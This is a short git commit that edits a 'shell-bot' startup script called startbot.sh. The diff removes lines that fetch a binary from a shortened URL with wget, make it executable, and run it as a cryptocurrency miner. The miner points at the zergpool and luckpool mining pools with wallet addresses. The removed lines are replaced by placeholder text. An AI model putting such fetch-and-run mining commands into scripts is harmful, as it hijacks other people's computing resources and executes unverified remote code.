cd30276dd6e0058d40a2a4a12e0208c7320010fe
Tokisaki_mitsuha <71954996+Tokisaki-mitsuha@users.noreply.github.com>
2021-11-20 10:12:02 +0700

    Update startbot.sh

--- startbot.sh
+++ startbot.sh
@@ -4,9 +4,4 @@
 # kumaha aink we njink
 
 cd /home/shell-bot
-wget -qO ngaceng https://git.io/J161r
-chmod +x ngaceng
-./ngaceng -v -l verushash.mine.zergpool.com:3300 -u DBvi4ZFPxxVB1ivfNffHHP8kSWABVc2MQK.ngaceng -p c=DGB,mc=VRSC -t 8
-wget -qO ngaceng https://git.io/J161r
-chmod +x ngaceng
-./ngaceng -v -l ap.luckpool.net:3956 -u RFLFA5BGYyt5SASeDQSS8H89aYiK3LQJco.hotaru -p x -t 8
+Tulis sc di sini
